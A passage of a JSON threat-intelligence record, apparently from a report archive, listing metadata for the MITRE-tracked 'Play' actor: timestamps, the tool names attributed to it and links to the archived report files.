            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041679,
    "ts_creation_date": 1641603380,
    "ts_modification_date": 1641603380,
    "files": {
        "pdf": "https://archive.orkl.eu/6ed98087e8d743c12252928698ca026b13ee0660.pdf",
        "text": "https://archive.orkl.eu/6ed98087e8d743c12252928698ca026b13ee0660.txt",
        "img": "https://archive.orkl.eu/6ed98087e8d743c12252928698ca026b13ee0660.jpg"
    }
}